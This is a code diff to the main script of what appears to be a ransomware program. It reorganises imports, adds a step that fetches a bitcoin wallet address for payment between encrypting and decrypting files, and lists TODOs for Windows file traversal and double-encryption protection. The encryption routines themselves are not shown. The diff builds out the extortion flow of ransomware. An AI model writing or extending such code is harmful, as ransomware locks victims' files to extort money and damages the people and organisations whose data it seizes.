@@ -1,7 +1,8 @@
 import logging
-from encrypt_files import start_encryption
-from decrypt_files import start_decryption
-from utils import get_files_to_be_encrypted, generate_bitcoin_address
+from core.encrypt_files import start_encryption
+from core.decrypt_files import start_decryption
+from core.comms.payment import get_bitcoin_wallet_address
+from core.utils import get_files_to_be_encrypted
 
 logging.basicConfig(
     format="%(asctime)s %(module)s %(levelname)s: %(message)s", level=logging.INFO
@@ -13,7 +14,7 @@ logger = logging.getLogger(__name__)
 # TODO: Add exception handling
 # TODO: Implement Windows file traversal logic
 # TODO: Add explicit garbage collection
-# TODO: Add Comprehensive Logging
+# TODO: Add comprehensive Logging
 # TODO: Add double encryption protection
 
 
@@ -23,7 +24,6 @@ def encrypt_button_handler():
     # current_directory = os.path.dirname(os.path.abspath(__file__))
     list_of_files_to_be_encrypted = get_files_to_be_encrypted(current_directory)
     start_encryption(list_of_files_to_be_encrypted)
-    generate_bitcoin_address()
     logger.info("ENCRYPTION DONE")
 
 
@@ -32,7 +32,10 @@ def decrypt_button_handler():
     start_decryption()
     logger.info("DECRYPTION DONE")
 
+def get_payment_details():
+    get_bitcoin_wallet_address()
 
 if __name__ == "__main__":
     encrypt_button_handler()
+    get_payment_details()
     decrypt_button_handler()
